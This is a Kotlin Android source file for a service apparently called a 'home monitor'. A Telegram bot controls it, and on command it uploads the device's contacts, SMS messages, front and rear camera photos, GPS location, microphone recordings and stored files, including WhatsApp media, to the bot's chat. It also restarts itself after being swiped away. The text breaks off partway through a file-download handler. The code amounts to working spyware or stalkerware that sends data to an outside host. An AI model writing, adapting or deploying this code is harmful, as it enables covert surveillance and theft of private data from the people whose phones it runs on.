package com.homemonitor

import android.Manifest
import android.app.PendingIntent
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.util.Log
import android.webkit.MimeTypeMap
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

/**
 * MonitorService
 *
 * A foreground LifecycleService that handles remote commands via a Telegram Bot.
 */
class MonitorService : LifecycleService() {

    companion object {
        private const val BOT_TOKEN = "YOUR-TELEGRAM-BOT-TOKEN"   
        private const val CHAT_ID   = "YOUR-CHAT-ID"     

        private const val TAG                = "MonitorService"
        private const val NOTIFICATION_ID    = 1001
        private const val POLL_INTERVAL_MS   = 8_000L          
        private const val MAX_CONTACTS       = 20

        private val BASE_URL          = "https://api.telegram.org/bot$BOT_TOKEN"
        private val BASE_FILE_URL     = "https://api.telegram.org/file/bot$BOT_TOKEN"
        private val URL_GET_UPDATES   = "$BASE_URL/getUpdates"
        private val URL_SEND_MSG      = "$BASE_URL/sendMessage"
        private val URL_SEND_PHOTO    = "$BASE_URL/sendPhoto"
        private val URL_SEND_DOCUMENT = "$BASE_URL/sendDocument"
        private val URL_SEND_AUDIO    = "$BASE_URL/sendAudio"
        private val URL_GET_FILE      = "$BASE_URL/getFile"

        private const val MAX_FILES = 20
    }

    private data class FileEntry(
        val displayName: String,
        val uri:         Uri,
        val sizeBytes:   Long,
        val mimeType:    String
    )

    private val fileCache = mutableMapOf<String, List<FileEntry>>()
    private val folderFileCache = mutableMapOf<String, List<File>>()

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(20, TimeUnit.SECONDS)
        .build()

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null

    @Volatile private var updateOffset: Long = 0L

    private val cameraExecutor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Service created")
        startForegroundWithNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        Log.i(TAG, "Service started")

        pollJob?.cancel()
        pollJob = serviceScope.launch {
            pollLoop()
        }

        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.i(TAG, "Task removed — scheduling self-restart")
        val restartIntent = Intent(applicationContext, MonitorService::class.java)
        val pendingIntent = PendingIntent.getService(
            applicationContext,
            1,
            restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(ALARM_SERVICE) as android.app.AlarmManager
        alarmManager.set(
            android.app.AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 1_000L,
            pendingIntent
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "Service destroyed")
        pollJob?.cancel()
        serviceScope.cancel()
        cameraExecutor.shutdown()
    }

    private fun startForegroundWithNotification() {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, getString(R.string.notif_channel_id))
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(getString(R.string.notif_text))
            .setSmallIcon(android.R.drawable.ic_menu_compass) 
            .setOngoing(true)                                  
            .setContentIntent(pendingIntent)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  TELEGRAM POLLING LOOP (FIXED CANDIDATE MISMATCH HERE)
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun pollLoop() {
        Log.i(TAG, "Poll loop started (interval = ${POLL_INTERVAL_MS}ms)")
        // Using serviceScope.isActive directly targets the scope explicitly
        while (serviceScope.isActive) {
            try {
                val updates = fetchUpdates()
                updates.forEach { update -> handleUpdate(update) }
            } catch (e: Exception) {
                Log.e(TAG, "Poll error: ${e.message}")
            }
            delay(POLL_INTERVAL_MS)
        }
    }

    private fun fetchUpdates(): List<JSONObject> {
        val url = "$URL_GET_UPDATES?offset=$updateOffset&limit=10&timeout=0"
        val request = Request.Builder().url(url).get().build()

        val responseBody = httpClient.newCall(request).execute().use { response ->
            if (!response.isSuccessful) return emptyList()
            response.body?.string() ?: return emptyList()
        }

        val json = JSONObject(responseBody)
        if (!json.optBoolean("ok", false)) return emptyList()

        val result = json.getJSONArray("result")
        val updates = mutableListOf<JSONObject>()

        for (i in 0 until result.length()) {
            val update = result.getJSONObject(i)
            updates.add(update)

            val updateId = update.getLong("update_id")
            if (updateId >= updateOffset) {
                updateOffset = updateId + 1
            }
        }

        return updates
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  COMMAND DISPATCHER
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleUpdate(update: JSONObject) {
        val message = update.optJSONObject("message") ?: return
        val chatId  = message.optJSONObject("chat")?.optString("id") ?: CHAT_ID

        val document = message.optJSONObject("document")
        val photoArr = message.optJSONArray("photo")
        when {
            document != null -> {
                handleIncomingDocument(chatId, document)
                return
            }
            photoArr != null && photoArr.length() > 0 -> {
                val largest = photoArr.getJSONObject(photoArr.length() - 1)
                handleIncomingDocument(
                    chatId,
                    largest,
                    fallbackName = "photo_${System.currentTimeMillis()}.jpg"
                )
                return
            }
        }

        val rawText = message.optString("text", "").trim()
        val text = rawText.substringBefore("@").lowercase(Locale.getDefault())

        Log.i(TAG, "Received command: '$text' from chatId: $chatId")

        when {
            text == "/status" || text == "/alive"  -> handleStatus(chatId)
            text == "/contacts"                    -> handleContacts(chatId)
            text == "/camera"                      -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA)
            text == "/frontcam"                    -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA)
            text == "/location"                    -> handleLocation(chatId)
            text == "/files"                       -> handleFiles(chatId, "")
            text.startsWith("/files ")             -> handleFiles(chatId, text.removePrefix("/files "))
            text == "/sms"                         -> handleSms(chatId, "")
            text.startsWith("/sms ")               -> handleSms(chatId, rawText.removePrefix("/sms ").trim())
            text == "/filemn"                      -> handleFileMn(chatId, "")
            text.startsWith("/filemn ")            -> handleFileMn(chatId, rawText.removePrefix("/filemn ").trim())
            text.matches(Regex("/audio\\d+"))      -> handleAudio(chatId, text.removePrefix("/audio").toIntOrNull() ?: 10)
            text.startsWith("/audio ")             -> handleAudio(chatId, text.removePrefix("/audio ").trim().toIntOrNull() ?: 10)
            text == "/audio"                       -> sendMessage(chatId, "ℹ️ Usage: /audio20 or /audio 30 (seconds to record, max 120)")
            else -> { }
        }
    }

    private fun handleStatus(chatId: String) {
        val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(Date())
        val reply = "✅ Phone Alive\n🕐 $timeStr"
        sendMessage(chatId, reply)
    }

    private fun handleContacts(chatId: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ READ_CONTACTS permission not granted.")
            return
        }

        val contacts = readContacts()
        if (contacts.isEmpty()) {
            sendMessage(chatId, "📭 No contacts found on this device.")
            return
        }

        val sb = StringBuilder("📒 *Contacts* (${contacts.size}):\n\n")
        contacts.forEachIndexed { index, (name, number) ->
            sb.append("${index + 1}. *$name*\n   `$number`\n")
        }

        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun readContacts(): List<Pair<String, String>> {
        val contacts = mutableListOf<Pair<String, String>>()
        val resolver: ContentResolver = contentResolver

        val cursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null,
            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
        ) ?: return contacts

        cursor.use {
            val nameCol   = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext() && contacts.size < MAX_CONTACTS) {
                val name   = it.getString(nameCol)  ?: "Unknown"
                val number = it.getString(numberCol) ?: "N/A"
                contacts.add(Pair(name, number))
            }
        }

        return contacts
    }

    private fun handleSms(chatId: String, filter: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ READ_SMS permission not granted.")
            return
        }

        val messages = readSmsMessages(filter.trim())

        if (messages.isEmpty()) {
            val hint = if (filter.isBlank()) "No SMS messages found."
                       else "No messages found for number: $filter"
            sendMessage(chatId, "📭 $hint")
            return
        }

        val header  = if (filter.isBlank())
            "💬 *Last SMS messages* (${messages.size}):\n\n"
        else
            "💬 *SMS with* `$filter` (${messages.size}):\n\n"

        val sb = StringBuilder(header)

        messages.forEach { msg ->
            val line = "${msg.dirEmoji} *${msg.address}*\n" +
                       "   🕐 ${msg.dateStr}\n" +
                       "   ${msg.body}\n\n"

            if (sb.length + line.length > 4_000) {
                sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
                sb.clear()
            }
            sb.append(line)
        }

        if (sb.isNotBlank()) {
            sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
        }
    }

    private data class SmsEntry(
        val dirEmoji: String,   
        val address:  String,   
        val dateStr:  String,
        val body:     String
    )

    private fun readSmsMessages(numberFilter: String, limit: Int = 20): List<SmsEntry> {
        val results = mutableListOf<SmsEntry>()
        val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())

        val (selection, selArgs) = if (numberFilter.isNotEmpty()) {
            Pair("address LIKE ?", arrayOf("%${numberFilter.takeLast(7)}%"))
        } else {
            Pair(null, null)
        }

        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            ),
            selection,
            selArgs,
            "${Telephony.Sms.DATE} DESC"
        ) ?: return results

        cursor.use { c ->
            val addrCol = c.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyCol = c.getColumnIndex(Telephony.Sms.BODY)
            val dateCol = c.getColumnIndex(Telephony.Sms.DATE)
            val typeCol = c.getColumnIndex(Telephony.Sms.TYPE)

            while (c.moveToNext() && results.size < limit) {
                val address  = c.getString(addrCol) ?: "Unknown"
                val rawBody  = c.getString(bodyCol) ?: ""
                val dateMs   = c.getLong(dateCol)
                val smsType  = c.getInt(typeCol)

                val body = if (rawBody.length > 120)
                    rawBody.take(120) + "…"
                else
                    rawBody

                val safeBody = body
                    .replace("_", "\\_")
                    .replace("*", "\\*")
                    .replace("`", "\\`")
                    .replace("[", "\\[")

                val dirEmoji = if (smsType == Telephony.Sms.MESSAGE_TYPE_SENT) "📤" else "📨"

                results.add(
                    SmsEntry(
                        dirEmoji = dirEmoji,
                        address  = address,
                        dateStr  = dateFmt.format(Date(dateMs)),
                        body     = safeBody
                    )
                )
            }
        }

        return results
    }

    private fun handleCamera(chatId: String, cameraSelector: CameraSelector) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ CAMERA permission not granted.")
            return
        }

        val label = if (cameraSelector == CameraSelector.DEFAULT_FRONT_CAMERA) "front" else "rear"
        sendMessage(chatId, "📷 Taking photo ($label camera)…")

        mainHandler.post {
            val providerFuture = ProcessCameraProvider.getInstance(this)
            providerFuture.addListener({
                var cameraProvider: ProcessCameraProvider? = null
                try {
                    cameraProvider = providerFuture.get()

                    val capture = ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .build()

                    cameraProvider.unbindAll()
                    cameraProvider.bindToLifecycle(
                        this,
                        cameraSelector,
                        capture
                    )

                    val photoFile = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                    val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

                    capture.takePicture(
                        outputOptions,
                        cameraExecutor,
                        object : ImageCapture.OnImageSavedCallback {

                            override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                                mainHandler.post {
                                    try { cameraProvider?.unbindAll() } catch (_: Exception) {}
                                }
                                Log.i(TAG, "Photo saved, camera released")
                                sendPhoto(chatId, photoFile)
                                photoFile.delete()
                            }

                            override fun onError(exc: ImageCaptureException) {
                                mainHandler.post {
                                    try { cameraProvider?.unbindAll() } catch (_: Exception) {}
                                }
                                Log.e(TAG, "Photo capture failed: ${exc.message}")
                                sendMessage(chatId, "❌ Failed to take photo: ${exc.message}")
                            }
                        }
                    )

                } catch (e: Exception) {
                    mainHandler.post {
                        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
                    }
                    Log.e(TAG, "Camera error: ${e.message}")
                    sendMessage(chatId, "❌ Camera error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun handleLocation(chatId: String) {
        val hasFine   = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)   == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasFine && !hasCoarse) {
            sendMessage(chatId, "⚠️ Location permission not granted.")
            return
        }

        val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager

        val lastKnown: Location? = try {
            val gps     = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val network = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            when {
                gps     != null && network != null ->
                    if (gps.time >= network.time) gps else network
                gps     != null -> gps
                else            -> network
            }
        } catch (e: SecurityException) {
            null
        }

        val maxAgeMs = 3 * 60 * 1000L   
        val now      = System.currentTimeMillis()

        if (lastKnown != null && (now - lastKnown.time) <= maxAgeMs) {
            sendLocationReply(chatId, lastKnown, fresh = false)
            return
        }

        sendMessage(chatId, "📡 Acquiring GPS fix…")

        val timeoutMs   = 20_000L   
        val provider    = when {
            hasFine  -> LocationManager.GPS_PROVIDER
            else     -> LocationManager.NETWORK_PROVIDER
        }

        var responded = false

        val listener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                if (!responded) {
                    responded = true
                    try { locationManager.removeUpdates(this) } catch (_: Exception) {}
                    sendLocationReply(chatId, location, fresh = true)
                }
            }
            @Deprecated("Deprecated in Java")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {
                if (!responded) {
                    responded = true
                    try { locationManager.removeUpdates(this) } catch (_: Exception) {}
                    sendMessage(chatId, "❌ Location provider disabled.")
                }
            }
        }

        try {
            locationManager.requestLocationUpdates(
                provider,
                0L,   
                0f,   
                listener,
                mainHandler.looper
            )
        } catch (e: SecurityException) {
            sendMessage(chatId, "❌ Location permission revoked: ${e.message}")
            return
        }

        mainHandler.postDelayed({
            if (!responded) {
                responded = true
                try { locationManager.removeUpdates(listener) } catch (_: Exception) {}
                if (lastKnown != null) {
                    sendLocationReply(chatId, lastKnown, fresh = false, staleWarning = true)
                } else {
                    sendMessage(chatId, "❌ Could not obtain a location fix. Make sure GPS is enabled.")
                }
            }
        }, timeoutMs)
    }

    private fun sendLocationReply(
        chatId:       String,
        location:     Location,
        fresh:        Boolean,
        staleWarning: Boolean = false
    ) {
        val lat = location.latitude
        val lon = location.longitude
        val acc = if (location.hasAccuracy()) "±${location.accuracy.toInt()} m" else "unknown"
        val alt = if (location.hasAltitude()) "${location.altitude.toInt()} m" else "N/A"
        val mapsUrl = "https://maps.google.com/?q=$lat,$lon"

        val ageSeconds = (System.currentTimeMillis() - location.time) / 1000
        val ageLabel   = when {
            ageSeconds < 60          -> "${ageSeconds}s ago"
            ageSeconds < 3600        -> "${ageSeconds / 60}m ago"
            else                     -> "${ageSeconds / 3600}h ago"
        }

        val header = when {
            staleWarning -> "⚠️ *Stale location* (GPS timed out, sending last known fix):"
            fresh        -> "📍 *Current Location*:"
            else         -> "📍 *Last Known Location* ($ageLabel):"
        }

        val msg = """
            $header
            
            🌐 Lat: `$lat`
            🌐 Lon: `$lon`
            🎯 Accuracy: $acc
            ⛰ Altitude: $alt
            🗺 [Open in Google Maps]($mapsUrl)
        """.trimIndent()

        sendMessage(chatId, msg, parseMode = "Markdown")
    }

    private fun handleFiles(chatId: String, args: String) {
        val trimmed = args.trim()
        if (trimmed.isEmpty()) {
            listFiles(chatId)
        } else {
            val num = trimmed.toIntOrNull()
            if (num != null) {
                sendFileByNumber(chatId, num)
            } else {
                sendMessage(chatId,
                    "Usage:\n" +
                    "• /files — list files\n" +
                    "• /files <number> — send that file to this chat\n" +
                    "• Send any file/photo to this chat → saves it to Downloads"
                )
            }
        }
    }

    private fun listFiles(chatId: String) {
        val entries = mutableListOf<FileEntry>()

        fun queryCollection(
            collectionUri: Uri,
            mimeDefault:   String,
            slotLimit:     Int = MAX_FILES
        ) {
            if (entries.size >= MAX_FILES) return
            val canTake = minOf(slotLimit, MAX_FILES - entries.size)
            val projection = arrayOf(
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.MIME_TYPE
            )
            contentResolver.query(
                collectionUri,
                projection,
                "${MediaStore.MediaColumns.SIZE} > 0",
                null,
                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
            )?.use { cursor ->
                val idCol   = cursor.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE)
                val mimeCol = cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
                var taken = 0
                while (cursor.moveToNext() && taken < canTake) {
                    val id   = cursor.getLong(idCol)
                    val name = cursor.getString(nameCol) ?: "unknown"
                    val size = cursor.getLong(sizeCol)
                    val mime = cursor.getString(mimeCol) ?: mimeDefault
                    val uri  = Uri.withAppendedPath(collectionUri, id.toString())
                    entries.add(FileEntry(name, uri, size, mime))
                    taken++
                }
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            queryCollection(MediaStore.Downloads.EXTERNAL_CONTENT_URI, "application/octet-stream")
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q && entries.size < MAX_FILES) {
            val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            dir.listFiles()
                ?.sortedByDescending { it.lastModified() }
                ?.forEach { file ->
                    if (entries.size >= MAX_FILES) return@forEach
                    if (!file.isDirectory && file.length() > 0) {
                        val mime = MimeTypeMap.getSingleton()
                            .getMimeTypeFromExtension(file.extension.lowercase())
                            ?: "application/octet-stream"
                        entries.add(FileEntry(file.name, Uri.fromFile(file), file.length(), mime))
                    }
                }
        }

        if (entries.size < MAX_FILES) {
            queryCollection(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image/jpeg", slotLimit = 5)
        }

        if (entries.size < MAX_FILES) {
            queryCollection(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video/mp4", slotLimit = 5)
        }

        if (entries.size < MAX_FILES) {
            queryCollection(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio/mpeg", slotLimit = 5)
        }

        if (entries.isEmpty()) {
            sendMessage(chatId, "📂 No files found in storage.")
            return
        }

        fileCache[chatId] = entries

        val sb = StringBuilder("📂 *Files on device* (${entries.size}):\n\n")
        entries.forEachIndexed { i, f ->
            val sizeLabel = when {
                f.sizeBytes >= 1_048_576 -> "${"%.1f".format(f.sizeBytes / 1_048_576.0)} MB"
                f.sizeBytes >= 1_024     -> "${"%.1f".format(f.sizeBytes / 1_024.0)} KB"
                else                     -> "${f.sizeBytes} B"
            }
            sb.append("${i + 1}. `${f.displayName}` — $sizeLabel\n")
        }
        sb.append("\nReply with `/files <number>` to receive a file.")
        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun sendFileByNumber(chatId: String, number: Int) {
        val list = fileCache[chatId]
        if (list.isNullOrEmpty()) {
            sendMessage(chatId, "⚠️ No file list for this chat. Send /files first.")
            return
        }
        val idx = number - 1
        if (idx < 0 || idx >= list.size) {
            sendMessage(chatId, "❌ Number out of range. Choose 1–${list.size}.")
            return
        }
        val entry = list[idx]
        sendMessage(chatId, "📤 Sending *${entry.displayName}*…", parseMode = "Markdown")

        try {
            val stream = contentResolver.openInputStream(entry.uri)
                ?: run { sendMessage(chatId, "❌ Cannot read file."); return }

            val bytes = stream.use { it.readBytes() }
            val body  = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart(
                    "document",
                    entry.displayName,
                    bytes.toRequestBody(entry.mimeType.toMediaTypeOrNull())
                )
                .addFormDataPart("caption", "📎 ${entry.displayName}")
                .build()

            val request = Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()
            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w(TAG, "sendDocument failed: ${response.code}")
                    sendMessage(chatId, "❌ Upload failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendFileByNumber exception: ${e.message}")
            sendMessage(chatId, "❌ Error sending file: ${e.message}")
        }
    }

    private fun handleAudio(chatId: String, seconds: Int) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ RECORD_AUDIO permission not granted.")
            return
        }

        val duration = seconds.coerceIn(1, 120)
        sendMessage(chatId, "🎙️ Recording audio for $duration seconds…")

        serviceScope.launch {
            val outFile = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
            @Suppress("DEPRECATION")
            val recorder: android.media.MediaRecorder =
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    android.media.MediaRecorder(this@MonitorService)
                else
                    android.media.MediaRecorder()

            try {
                recorder.apply {
                    setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                    setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100)
                    setAudioEncodingBitRate(128_000)
                    setOutputFile(outFile.absolutePath)
                    prepare()
                    start()
                }

                delay(duration * 1_000L)

                recorder.stop()
                recorder.release()

                if (!outFile.exists() || outFile.length() == 0L) {
                    sendMessage(chatId, "❌ Recording produced an empty file.")
                    return@launch
                }

                val bytes = outFile.readBytes()
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart(
                        "audio",
                        outFile.name,
                        bytes.toRequestBody("audio/mp4".toMediaTypeOrNull())
                    )
                    .addFormDataPart("title", "Recording (${duration}s)")
                    .addFormDataPart("duration", duration.toString())
                    .build()

                val request = Request.Builder().url(URL_SEND_AUDIO).post(body).build()
                httpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.w(TAG, "sendAudio failed: ${response.code}")
                        sendMessage(chatId, "❌ Upload failed: ${response.code}")
                    }
                }

            } catch (e: Exception) {
                Log.e(TAG, "Audio recording error: ${e.message}")
                sendMessage(chatId, "❌ Recording error: ${e.message}")
                try { recorder.release() } catch (_: Exception) {}
            } finally {
                try { outFile.delete() } catch (_: Exception) {}
            }
        }
    }

    private fun handleFileMn(chatId: String, arg: String) {
        if (arg.isEmpty()) {
            showTopFolders(chatId)
            return
        }

        val parts = arg.split(" ")
        val lastNum = parts.last().toIntOrNull()
        if (lastNum != null && parts.size >= 2) {
            sendFolderFile(chatId, lastNum)
            return
        }

        listFolderContents(chatId, arg)
    }

    private fun showTopFolders(chatId: String) {
        val root = Environment.getExternalStorageDirectory()
        val dirs = root.listFiles()
            ?.filter { it.isDirectory }
            ?.sortedBy { it.name.lowercase() }
            ?: emptyList()

        if (dirs.isEmpty()) {
            sendMessage(chatId, "📁 No folders found on storage.")
            return
        }

        val sb = StringBuilder("📁 *Folders on device:*\n\n")
        dirs.forEach { dir ->
            val count = dir.listFiles()?.size ?: 0
            sb.append("• `${dir.name}` — $count items\n")
        }
        sb.append("\n📂 Type `/filemn <folder>` to browse files inside it.")
        sb.append("\n📂 Sub-folders: `/filemn WhatsApp/Media`")
        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun listFolderContents(chatId: String, folderPath: String) {
        val root = Environment.getExternalStorageDirectory()

        val target: File? = run {
            val direct = File(root, folderPath)
            if (direct.exists() && direct.isDirectory) return@run direct

            var current = root
            for (segment in folderPath.split("/")) {
                current = current.listFiles()
                    ?.firstOrNull { it.name.lowercase() == segment.lowercase() && it.isDirectory }
                    ?: return@run null
            }
            current
        }

        if (target == null) {
            sendMessage(chatId, "❌ Folder `$folderPath` not found.\n\nUse /filemn to see all folders.", parseMode = "Markdown")
            return
        }

        val all = target.listFiles() ?: emptyArray()
        val files   = all.filter { it.isFile && it.length() > 0 }.sortedByDescending { it.lastModified() }.take(30)
        val subDirs = all.filter { it.isDirectory }.sortedBy { it.name }

        if (files.isEmpty() && subDirs.isEmpty()) {
            sendMessage(chatId, "📂 Folder `${target.name}` is empty.", parseMode = "Markdown")
            return
        }

        folderFileCache[chatId] = files

        val sb = StringBuilder("📂 *${folderPath}/* \n\n")

        if (subDirs.isNotEmpty()) {
            sb.append("🗂 *Sub-folders:*\n")
            subDirs.forEach { d ->
                val c = d.listFiles()?.size ?: 0
                sb.append("  • `${d.name}` ($c items)  → `/filemn $folderPath/${d.name}`\n")
            }
            sb.append("\n")
        }

        if (files.isNotEmpty()) {
            sb.append("📄 *Files (${files.size}):*\n")
            files.forEachIndexed { i, f ->
                val size = when {
                    f.length() >= 1_048_576 -> "${"%.1f".format(f.length() / 1_048_576.0)} MB"
                    f.length() >= 1_024     -> "${"%.1f".format(f.length() / 1_024.0)} KB"
                    else                    -> "${f.length()} B"
                }
                sb.append("${i + 1}. `${f.name}` — $size\n")
            }
            sb.append("\nType `/filemn $folderPath <number>` to download a file.")
        } else {
            sb.append("_(no files here — browse a sub-folder above)_")
        }

        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun sendFolderFile(chatId: String, number: Int) {
        val list = folderFileCache[chatId]
        if (list.isNullOrEmpty()) {
            sendMessage(chatId, "⚠️ No folder listed yet. Use `/filemn <folder>` first.", parseMode = "Markdown")
            return
        }
        val idx = number - 1
        if (idx < 0 || idx >= list.size) {
            sendMessage(chatId, "❌ Number out of range. Choose 1–${list.size}.")
            return
        }
        val file = list[idx]
        sendMessage(chatId, "📤 Sending *${file.name}*…", parseMode = "Markdown")
        try {
            val bytes = file.readBytes()
            val mime  = MimeTypeMap.getSingleton()
                .getMimeTypeFromExtension(file.extension.lowercase())
                ?: "application/octet-stream"
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("document", file.name, bytes.toRequestBody(mime.toMediaTypeOrNull()))
                .addFormDataPart("caption", "📎 ${file.name}")
                .build()
            val req = Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()
            httpClient.newCall(req).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w(TAG, "sendFolderFile failed: ${response.code}")
                    sendMessage(chatId, "❌ Upload failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendFolderFile exception: ${e.message}")
            sendMessage(chatId, "❌ Error sending file: ${e.message}")
        }
    }

    private fun handleIncomingDocument(
        chatId:       String,
        fileObj:      JSONObject,
        fallbackName: String = "received_${System.currentTimeMillis()}"
    ) {
        val fileId = fileObj.optString("file_id").ifEmpty {
            sendMessage(chatId, "⚠️ Could not read file_id."); return
        }
        val fileName = fileObj.optString("file_name").ifEmpty { fallbackName }

        sendMessage(chatId, "💾 Saving *$fileName* to Downloads…", parseMode = "Markdown")

        serviceScope.launch {
            try {
                val filePath = getTelegramFilePath(fileId)
                if (filePath == null) {
                    sendMessage(chatId, "❌ Could not resolve file path from Telegram.")
                    return@launch
                }

